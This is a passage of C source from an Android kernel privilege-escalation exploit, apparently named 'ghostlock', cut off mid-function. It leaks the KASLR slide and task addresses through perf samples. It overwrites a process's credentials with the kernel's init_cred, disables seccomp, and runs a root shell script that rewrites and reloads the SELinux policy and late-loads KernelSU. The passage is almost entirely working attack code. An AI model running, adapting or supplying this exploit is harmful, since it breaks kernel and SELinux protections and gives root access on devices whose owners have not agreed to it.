      "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
      "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
      "  echo '[!] KernelSU module not loaded (non-GKI kernel)' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "KMI=\"${AVER}-${KVER}\"\n"
      "# safe mode: disable all modules before exec ksud\n"
      "if [ \"$GHOSTLOCK_DISABLE_MODULES\" = \"1\" ]; then\n"
      "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
      "  n=0\n"
      "  for m in /data/adb/modules/*//*; do\n"  // added /* here too
      "    [ -d \"$m\" ] || continue\n"
      "    if touch \"${m}disable\" 2>/dev/null; then\n"
      "      n=$((n+1))\n"
      "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
      "    fi\n"
      "  done\n"
      "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
      "fi\n"
      "# step 1: restore policy\n"
      "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
      "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
      "  exit 1\n"
      "}\n"
      "trap 'rm -f \"$POLICY\"' EXIT\n"
      "prepare_policy() {\n"
      "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
      "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
      "  case \"$HEADER\" in\n"
      "    8cff7cf9080000005345204c696e7578????????????????) ;;\n"
      "    *) echo '[!] invalid policy header'; return 1 ;;\n"
      "  esac\n"
      "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
      "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
      "  [ -n \"$CONFIG\" ] || return 1\n"
      "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
      "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
      "}\n"
      "KSU_ALREADY=0\n"
      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  KSU_ALREADY=1\n"
      "fi\n"
      "FIXUP_RC=1\n"  
      "# a reload unlabels running processes, init exits 127 on the stale SID\n"
      "for i in $(seq 1 10); do\n"
      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
      "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
      "    sleep 2\n"
      "    continue\n"
      "  fi\n"
      "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
      "  LPID=$!\n"
      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
      "  SPID=$!\n"
      "  wait $LPID 2>/dev/null\n"
      "  FIXUP_RC=$?\n"
      "  kill $SPID 2>/dev/null\n"
      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "    break\n"
      "  fi\n"
      "  sleep 2\n"
      "done\n"
      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "# load_policy ok: late-load only when the module is not in the tree yet\n"
      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
      "  echo '[+] kernelsu already loaded; no late-load' >>\"$LOG\"\n"
      "else\n"
      "  if [ ! -x \"$KSUD\" ]; then\n"
      "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
      "    exit 1\n"
      "  fi\n"
      "  echo \"[*] late-load kmi=$KMI as uid=$(id -u)\" >>\"$LOG\"\n"
      "  chmod 755 \"$KSUD\" 2>/dev/null\n"
      "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
      "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
      "  KSU_READY=0\n"
      "  for i in $(seq 1 50); do\n"
      "    if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
      "    sleep 0.1\n"
      "  done\n"
      "  if [ \"$KSU_READY\" -ne 1 ]; then\n"
      "    echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
      "    exit 1\n"
      "  fi\n"
      "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
      "fi\n"
      "# enforcing puts the app dir out of reach, so the native side reads\n"
      "# the outcome\n"
      "if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" != \"1\" ]; then\n"
      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "fi\n"
      "else\n"
      "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
      "fi\n"
      "exit 0\n" */
      g_home_dir, g_ksu_log_path);
  if (n < 0 || n >= (int)sizeof(script)) {
    pr_warning("root script too long\n");
    close(sfd);
    return;
  }
  if (write(sfd, script, (size_t)n) != n) {
    pr_warning("write root script failed errno=%d\n", errno);
  }
  close(sfd);
  chmod(g_root_script_path, 0755);
}

static int kernelsu_module_loaded(void) {
  FILE *modules = fopen("/proc/modules", "r");
  if (!modules)
    return 0;

  char line[256];
  int loaded = 0;
  while (fgets(line, sizeof(line), modules)) {
    char name[64];
    if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
      loaded = 1;
      break;
    }
  }
  fclose(modules);
  return loaded;
}

/* Find a task through perf sample records. */
#ifdef GHOSTLOCK_TARGET_4_19
/* Leak the image KASLR slide and one randomized-linear-map address through
 * perf samples.  The sample IP is el0_svc_common+0x44 while getpid is
 * hammered; any direct-map register gives an anchor for the mm scan. */
int perf_leak_startup(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf startup open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++)
    syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t ips[1024];
  int nip = 0;
  uintptr_t dm[2048];
  int ndm = 0;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0)
      break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      uint64_t ip = *(uint64_t *)p;
      p += 8;
      uint64_t abi = *(uint64_t *)p;
      p += 8;
      if (nip < (int)(sizeof(ips) / sizeof(ips[0])))
        ips[nip++] = ip;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && ndm < (int)(sizeof(dm) / sizeof(dm[0]));
             i++) {
          uint64_t v = regs[i];
          if (v >= 0xffffffc000000000ULL)
            dm[ndm++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);
  if (!nip)
    return 0;

  /* el0_svc_common+0x44, link address from the 4.19.191 boot image. */
  const uint64_t link = 0xffffff80082248c8ULL;
  uint64_t slide = 0;
  int slide_votes = 0;
  for (int i = 0; i < nip; i++) {
    uint64_t d = (uint64_t)ips[i] - link;
    if ((d & 0x1fffffULL) != 0)
      continue;
    if (d < 0x1000000000ULL || d > 0x3000000000ULL)
      continue;
    int votes = 0;
    for (int j = 0; j < nip; j++) {
      uint64_t e = (uint64_t)ips[j] - link;
      if (e == d)
        votes++;
    }
    if (votes > slide_votes) {
      slide_votes = votes;
      slide = d;
    }
  }
  if (!slide) {
    pr_warning("perf startup: no KASLR slide vote (%d samples)\n", nip);
    return 0;
  }

  uint64_t anchor = 0;
  int anchor_votes = 0;
  for (int i = 0; i < ndm; i++) {
    int votes = 0;
    for (int j = 0; j < ndm; j++)
      if (dm[j] == dm[i])
        votes++;
    if (votes > anchor_votes) {
      anchor_votes = votes;
      anchor = dm[i];
    }
  }

  /* A single hot register can be a per-CPU or vmalloc pointer that is far
   * outside the linear map, so picking the most frequent value can centre the
   * mm scan on an unmapped window.  The real direct-map pointers (task, mm,
   * kernel stack, ...) all live inside the ~8 GiB linear map, so choose the
   * densest 8 GiB cluster of leaked register occurrences instead. */
  static uintptr_t sdm[2048];
  int nsdm = ndm < (int)(sizeof(sdm) / sizeof(sdm[0]))
                 ? ndm
                 : (int)(sizeof(sdm) / sizeof(sdm[0]));
  memcpy(sdm, dm, (size_t)nsdm * sizeof(sdm[0]));
  for (int i = 1; i < nsdm; i++) {
    uintptr_t v = sdm[i];
    int j = i - 1;
    while (j >= 0 && sdm[j] > v) {
      sdm[j + 1] = sdm[j];
      j--;
    }
    sdm[j + 1] = v;
  }
  const uint64_t ram_window = 8ULL << 30;
  uint64_t cluster_votes = 0;
  uintptr_t cluster_anchor = anchor;
  for (int i = 0; i < nsdm; i++) {
    uint64_t votes = 0;
    for (int j = i; j < nsdm && sdm[j] - sdm[i] <= ram_window; j++)
      votes++;
    if (votes > cluster_votes) {
      cluster_votes = votes;
      cluster_anchor = sdm[i];
    }
  }
  if (cluster_votes > (uint64_t)anchor_votes) {
    anchor = cluster_anchor;
    anchor_votes = (int)cluster_votes;
  }
  g_kernel_slide = slide;
  g_perf_anchor = anchor;
  pr_success("perf KASLR slide=%016llx (%d votes) anchor=%016llx (%d votes)\n",
             (unsigned long long)slide, slide_votes, (unsigned long long)anchor,
             anchor_votes);
  return 1;
}
#else
int perf_leak_startup(void) { return 1; }
#endif

/* Find a task through perf sample records. */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++)
    syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256];
  int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0)
      break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p;
      p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA
           */
          v |= 0x0fULL << 56;
          if (in_perf_direct(v))
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);
  if (!nc)
    return 0;
  uintptr_t best = 0;
  int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++)
      if (cands[j] == cands[i])
        cnt++;
    if (cnt > best_cnt) {
      best_cnt = cnt;
      best = cands[i];
    }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

/* Shared control block mapped MAP_SHARED before fork().  W2 makes the child's
 * subjective cred the kernel init_cred, and the pipe read/write checks can then
 * stop matching the shell pipe; keep the critical uid probe and the final G/P/X
 * handshake in user memory so verification never depends on the pipe. */
struct child_shared {
  volatile uint32_t probe; /* parent sets 1; child stores uid and clears */
  volatile uint32_t uid;
  volatile uint32_t go;   /* start the root script */
  volatile uint32_t park; /* park a rooted child */
  volatile uint32_t exit; /* retire an unrooted child */
  volatile uint32_t alive;
  volatile uint32_t watcher_ok;
};

struct child_pipes {
  int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w;
  struct child_shared *shared;
};

/* W2 stores the static init_cred into task->cred without taking a reference
 * and leaves task->real_cred pointing at the old shell cred.  Calling
 * commit_creds()/setresuid()/execve() in that task hits
 * BUG_ON(task->cred != task->real_cred).  fork() is safe: copy_creds() ->
 * prepare_creds() copies the *subjective* (root) cred into a brand-new,
 * fully consistent cred for the child.  This helper fixes up that child's
 * uid/gid/caps; it must only be called from the forked worker. */
static void commit_root_cred(void) {
  if (getuid() != 0)
    return;
  errno = 0;
  if (setresgid(0, 0, 0) != 0)
    pr_warning("setresgid(0,0,0) failed errno=%d\n", errno);
  errno = 0;
  if (setresuid(0, 0, 0) != 0)
    pr_warning("setresuid(0,0,0) failed errno=%d\n", errno);
  pr_info("root cred committed real_uid=%u euid=%u gid=%u egid=%u\n", getuid(),
          geteuid(), getgid(), getegid());
}

/* Keep the W2-rooted task alive without ever exiting.  Its task->cred is the
 * static init_cred but its task->real_cred is still the old shell cred, so an
 * exit would put_cred() a reference W2 never took.  All real work (cred
 * commit + root script) happens in a fork()ed child with a normal cred. */
static void park_rooted_child(void) {
  FILE *f = fopen("/proc/self/oom_score_adj", "w");
  if (f) {
    fputs("-1000", f);
    fclose(f);
  }
  for (;;)
    pause();
}

/* The child blocks in read(cmd_r).  A tiny watcher thread services the uid
 * probe and interrupts that read when the parent requests G/P/X, so the W2
 * handshake survives SELinux denying the pipe after task->cred=init_cred. */
struct child_watch_args {
  struct child_pipes *pipes;
  pthread_t main_thread;
};

static void child_signal_handler(int sig) { (void)sig; }

static void *child_shared_watch(void *arg) {
  struct child_watch_args *wa = arg;
  struct child_shared *sh = wa->pipes->shared;
  int sent_probe = 0;
  int sent_go = 0, sent_park = 0, sent_exit = 0;
  if (!sh)
    return NULL;
  for (;;) {
    /* The main thread owns the W2-written task->cred, so it must answer the
     * uid probe.  The watcher only pokes it out of read()/usleep(); it must
     * not report its own (unchanged) getuid(). */
    if (sh->probe) {
      if (!sent_probe) {
        sent_probe = 1;
        pthread_kill(wa->main_thread, SIGUSR1);
      }
    } else {
      sent_probe = 0;
    }
    if (!sent_exit && sh->exit) {
      sent_exit = 1;
      pthread_kill(wa->main_thread, SIGUSR1);
    } else if (!sent_park && sh->park) {
      sent_park = 1;
      pthread_kill(wa->main_thread, SIGUSR1);
    } else if (!sent_go && sh->go) {
      sent_go = 1;
      pthread_kill(wa->main_thread, SIGUSR1);
    }
    usleep(1000);
  }
  return NULL;
}

static void child_main(struct child_pipes *p) {
  close(p->task_r);
  close(p->cmd_w);
  close(p->uid_r);
  setpgid(0, 0); /* own group; the parent kills the whole tree on timeout */
  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC); /* keep the probe pipe out of the
                                         * root shell / ksud chain */
  prctl(PR_SET_NAME, "ghostleaf_0123456789");
  /* a real leak reproduces, a fluke vote winner does not. w2 writes to
   * this address, so two runs must agree or the leak is discarded. */
  uintptr_t my_task = perf_find_task();
  int leak_agreed = 0;
  for (int i = 0; i < 2 && my_task; i++) {
    uintptr_t again = perf_find_task();
    if (again == my_task) {
      leak_agreed = 1;
      break;
    }
    my_task = again;
  }
  if (!leak_agreed)
    my_task = 0;
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task)
    _exit(1);
  struct child_shared *sh = p->shared;
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = child_signal_handler;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = 0; /* no SA_RESTART: interrupt the command read */
  sigaction(SIGUSR1, &sa, NULL);
  if (sh) {
    struct child_watch_args wa = {.pipes = p, .main_thread = pthread_self()};
    pthread_t watcher;
    if (pthread_create(&watcher, NULL, child_shared_watch, &wa) == 0) {
      __sync_synchronize();
      sh->watcher_ok = 1;
      pthread_detach(watcher);
    } else {
      pr_warning("child shared watcher thread failed; using pipes only\n");
    }
  }
  char cmd = 0;
  int start_root = 0;
  for (;;) {
    /* Answer the parent's shared uid probe from *this* task: W2 changed only
     * this thread's subjective task->cred, while the watcher still has the
     * old shell cred.  This is a user-memory store, so it also survives the
     * route's post-W2 pipe/SELinux breakage. */
    if (sh && sh->probe) {
      sh->uid = (uint32_t)getuid();
      __sync_synchronize();
      sh->probe = 0;
    }
    cmd = 0;
    if (sh) {
      if (sh->exit)
        cmd = 'X';
      else if (sh->park)
        cmd = 'P';
      else if (sh->go) {
        cmd = 'G';
        start_root = 1;
      }
    }
    if (cmd == 0) {
      ssize_t nr = read(p->cmd_r, &cmd, 1);
      if (nr != 1) {
        if (nr < 0 && errno == EINTR)
          continue;
        /* The route may close or redirect the child's pipe fds.  Keep the
         * shared G/P/X channel alive instead of retiring a rooted task. */
        if (sh) {
          usleep(1000);
          continue;
        }
        break;
      }
    }
    if (cmd == 'C') {
      uint32_t uid = getuid();
      if (sh) {
        sh->uid = uid;
        __sync_synchronize();
      }
      write(p->uid_w, &uid, sizeof(uid));
    } else if (cmd == 'F') {
      /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
       * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
       * filter); mode==0 lets it run filter-free to a normal errno. Forked
       * so SIGSYS costs only this. */
      uint32_t code = 0xffffffff;
      int probe_pipe[2];
      if (pipe(probe_pipe) == 0) {
        pid_t probe = fork();
        if (probe == 0) {
          close(probe_pipe[0]);
          /* Forked probe: keep default SIGSYS so the filter kills it. */
          signal(SIGSYS, SIG_DFL);
          errno = 0;
          long r = syscall(__NR_finit_module, 0, 0, 0);
          uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
          ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
          (void)nw;
          _exit(0);
        }
        close(probe_pipe[1]);
        int st = 0;
        if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
          ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
          if (nr != (ssize_t)sizeof(code))
            code = 0xfffffffe;
        } else {
          code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
        }
        close(probe_pipe[0]);
      }
      write(p->uid_w, &code, sizeof(code));
    } else if (cmd == 'M') {
      /* Report comm length + first byte to tell which side a leaf=1 write
       * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
       * [target+8] len 8, untouched len 15. */
      char comm[24] = {0};
      FILE *cf = fopen("/proc/self/comm", "r");
      if (cf) {
        size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
        (void)n;
        fclose(cf);
      }
      size_t len = strlen(comm);
      while (len > 0 && comm[len - 1] == '\n') {
        comm[len - 1] = 0;
        len--;
      }
      uint32_t report = ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
      write(p->uid_w, &report, sizeof(report));
    } else if (cmd == 'P' || (cmd == 'X' && getuid() == 0)) {
      /* w2 rooted this task; park */
      close(p->cmd_r);
      close(p->uid_w);
      park_rooted_child();
    } else if (cmd == 'G') {
      start_root = 1;
      break;
    }
    /* X retires a task w2 rooted without starting the root script. a rooted
     * exit drops the init_cred ref w2 never took, so it parks above. */
    else if (cmd == 'X')
      _exit(1);
  }
  close(p->cmd_r);
  if (sh && sh->go)
    start_root = 1;
  if (!start_root) {
    /* EOF or a signal without G must never auto-start the root script; a
     * rooted task parks instead of exiting so the init_cred reference W2
     * never took is not dropped. */
    if ((sh && sh->park) || getuid() == 0) {
      close(p->uid_w);
      park_rooted_child();
    }
    close(p->uid_w);
    _exit(1);
  }
  if (getuid() != 0) {
    close(p->uid_w);
    _exit(1);
  }
  /* Don't leak app-side fds into the root shell chain: ksud/zygisk
   * daemons must not keep their write ends open. */
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0)
      fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }
  /* the script appends to this path, a leftover reads as this run's result */
  unlink(g_ksu_log_path);
  /* fork() copies our *subjective* root cred into a normal cred for the
   * worker (copy_creds -> prepare_creds), so real_cred == cred there and
   * commit_creds() is legal.  Never commit or exec in this task: W2 left
   * real_cred pointing at the old shell cred. */
  pid_t worker = fork();
  if (worker == 0) {
    commit_root_cred();
    /* Detach into a brand-new session: the independent root shell owns the
     * whole chain (ksud late-load + module watch) and must survive the
     * exploit parent killing this group on timeout. */
    if (setsid() < 0)
      _exit(1);
    /* W2 gives this task init_cred, i.e. the kernel SID.  Under enforcing the
     * kernel domain cannot exec/read the shell_data_file root script, so the
     * worker would die silently before starting the listener.  Ask SELinux
     * for the shell domain instead: uid stays 0, and the shell domain is
     * allowed to bind the listener port and execute the script.  Try setcon
     * first (changes the current SID, also covers the script file read), then
     * setexeccon for the next exec.  Both need CAP_MAC_ADMIN, which init_cred
     * carries; the policy decides whether the kernel domain may transition. */
    {
      static const char exec_ctx[] = "u:r:shell:s0";
      int afd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
      if (afd >= 0) {
        ssize_t n = write(afd, exec_ctx, sizeof(exec_ctx));
        worker_kmsg("setcon", n == (ssize_t)sizeof(exec_ctx) ? 0 : errno);
        close(afd);
      } else {
        worker_kmsg("open_current", errno);
      }
      afd = open("/proc/self/attr/exec", O_WRONLY | O_CLOEXEC);
      if (afd >= 0) {
        ssize_t n = write(afd, exec_ctx, sizeof(exec_ctx));
        worker_kmsg("setexeccon", n == (ssize_t)sizeof(exec_ctx) ? 0 : errno);
        close(afd);
      } else {
        worker_kmsg("open_exec", errno);
      }
    }
    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
    worker_kmsg("exec_sh", errno);
    pr_warning("root worker exec sh failed errno=%d; trying runcon\n", errno);
    execl("/system/bin/runcon", "runcon", "u:r:shell:s0", "/system/bin/sh",
          g_root_script_path, NULL);
    worker_kmsg("exec_runcon", errno);
    pr_warning("root worker exec runcon failed errno=%d; trying script\n",
               errno);
    execl(g_root_script_path, g_root_script_path, NULL);
    worker_kmsg("exec_script", errno);
    pr_warning("root worker exec script failed errno=%d\n", errno);
    _exit(1);
  }
  if (worker < 0) {
    pr_warning("fork() for root shell failed errno=%d; parking rooted child\n",
               errno);
    close(p->uid_w);
    park_rooted_child();
  }
  /* the worker holds a fresh, consistent cred copy; this task holds the raw
   * init_cred without a ref, so it must park instead of exiting */
  close(p->uid_w);
  park_rooted_child();
}

/* the route dup2s its block fd over every low fd in the fdset, so keep the
 * child pipes above PSELECT_ROUTE_NFDS or verify reads hit a timerfd */
static int raise_pipe_fd(int fd) {
  int high = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 96);
  if (high < 0) {
    pr_warning("pipe fd raise failed fd=%d errno=%d\n", fd, errno);
    return -1;
  }
  close(fd);
  return high;
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0)
    return -1;
  p->shared = mmap(NULL, sizeof(*p->shared), PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (p->shared == MAP_FAILED) {
    pr_warning("shared child page mmap failed errno=%d; using pipes only\n",
               errno);
    p->shared = NULL;
  } else {
    memset(p->shared, 0, sizeof(*p->shared));
  }
  int *raised[6] = {&p->task_r, &p->task_w, &p->cmd_r,
                    &p->cmd_w,  &p->uid_r,  &p->uid_w};
  int *raw[6] = {&p1[0], &p1[1], &p2[0], &p2[1], &p3[0], &p3[1]};
  for (int i = 0; i < 6; i++) {
    *raised[i] = raise_pipe_fd(*raw[i]);
    if (*raised[i] < 0)
      return -1;
  }
  pid_t child = fork();
  if (child < 0)
    return -1;
  if (child == 0) {
    child_main(p);
    _exit(1);
  }
  close(p->task_w);
  close(p->cmd_r);
  close(p->uid_w);
  return child;
}

/* Fork the victim and read back the task pointer perf leaked. */
static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
  pid_t child = spawn_child(p);
  if (child < 0)
    return -1;
  uintptr_t task = 0;
  ssize_t nr = read(p->task_r, &task, sizeof(task));
  close(p->task_r);
  *task_out = (nr == (ssize_t)sizeof(task)) ? task : 0;
  return child;
}

typedef int (*write_stage_verify_fn)(void *context);

/* Verify return values: 1 = stage confirmed, 0 = retry, 2 = the target task
 * is gone and another route would write into freed memory.  Abort those. */
static int run_stage_verify(const char *stage, write_stage_verify_fn verify,
                            void *context) {
  int v = verify(context);
  if (v == 2) {
    pr_warning("%s: target child is gone; not routing again\n", stage);
    return -1;
  }
  return v;
}

static int retry_write_stage(const char *stage, uintptr_t target, int mode,
                             int attempts, useconds_t settle_usec,
                             write_stage_verify_fn verify, void *context,
                             int leaf) {
  /* no attempt can move a target that is wrong by construction, and the
   * stage belongs in the log with the address rather than the route */
  if (!in_direct_map(target)) {
    pr_warning(
        "%s: target 0x%016zx is outside the direct map, not attempting\n",
        stage, target);
    return 0;
  }
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
    /* the previous attempt's write can land after its verify read; check
     * before paying for another heap spray */
    if (attempt > 1) {
      int v = run_stage_verify(stage, verify, context);
      if (v < 0)
        return 0;
      if (v)
        return 1;
    }
    if (attempt == 1)
      slab_drain();
    int routed = do_one_write(target, stage, mode, leaf);
    if (!routed) {
      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
      usleep(100000);
      continue;
    }
    if (settle_usec)
      usleep(settle_usec);
    int v = run_stage_verify(stage, verify, context);
    if (v < 0)
      return 0;
    if (v)
      return 1;
    usleep(50000);
  }
  /* the last write can land after its verify read */
  int v = run_stage_verify(stage, verify, context);
  return v > 0 ? 1 : 0;
}

static int verify_selinux_stage(void *context) {
  (void)context;
  if (!check_selinux_off())
    return 0;
  pr_success("SELinux permissive\n");
  return 1;
}

struct w2_stage_context {
  struct child_pipes *pipes;
  pid_t child;
};

struct w3_stage_context {
  struct child_pipes *pipes;
  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

static int verify_w2_stage(void *context) {
  struct w2_stage_context *stage = context;
  struct child_shared *sh = stage->pipes->shared;

  /* Ask the child's main thread first.  W2 overwrites the subjective
   * task->cred of the task that perf_find_task identified, i.e. the main
   * thread.  A pthread watcher is a separate task with its own task->cred and
   * still reports the old shell uid.  /proc/pid/status also reads real_cred,
   * which W2 deliberately leaves at the old shell cred, so neither is usable.
   * The shared word is written by the main thread itself and is immune to the
   * route closing/redirecting the child pipes. */
  if (sh && sh->watcher_ok) {
    sh->uid = 0xdeadbeefu;
    __sync_synchronize();
    sh->probe = 1;
    for (int i = 0; i < 500; i++) {
      if (sh->probe == 0)
        break;
      usleep(1000);
    }
    if (sh->probe == 0) {
      uint32_t child_uid = sh->uid;
      pr_info("child uid = %u (main-shared)\n", child_uid);
      if (child_uid == 0) {
        pr_success("child is root!\n");
        return 1;
      }
      return 0;
    }
    pr_warning("W2 verify: main-thread shared uid probe timed out\n");
  }

  /* Pipe fallback, for the first-round case where sh is unavailable. */
  if (write(stage->pipes->cmd_w, "C", 1) == 1) {
    uint32_t child_uid = 9999;
    ssize_t nr = read(stage->pipes->uid_r, &child_uid, sizeof(child_uid));
    if (nr == (ssize_t)sizeof(child_uid)) {
      pr_info("child uid = %u (main)\n", child_uid);
      if (child_uid == 0) {
        pr_success("child is root!\n");
        return 1;
      }
      return 0;
    }
    pr_warning("W2 verify: main-thread uid pipe read failed (%zd)\n", nr);
  }

  if (sh && sh->watcher_ok) {
    sh->uid = 0xdeadbeefu;
    __sync_synchronize();
    sh->probe = 1;
    for (int i = 0; i < 1000; i++) {
      if (sh->probe == 0)
        break;
      usleep(1000);
    }
    if (sh->probe == 0) {
      uint32_t child_uid = sh->uid;
      pr_info("child uid = %u (shared)\n", child_uid);
      if (child_uid != 0)
        return 0;
      pr_success("child is root!\n");
      return 1;
    }
    pr_warning("W2 verify: shared uid probe timed out\n");
    if (stage->child > 0) {
      int st = 0;
      pid_t wr = waitpid(stage->child, &st, WNOHANG);
      if (wr == stage->child) {
        pr_warning("W2 verify: child gone status=0x%x; aborting retries\n", st);
        return 2;
      }
      if (wr < 0 && errno == ECHILD) {
        pr_warning("W2 verify: child already reaped; aborting retries\n");
        return 2;
      }
    }
    return 0;
  }

  if (write(stage->pipes->cmd_w, "C", 1) != 1)
    return 0;
  uint32_t child_uid = 9999;
  if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
      (ssize_t)sizeof(child_uid)) {
    return 0;
  }
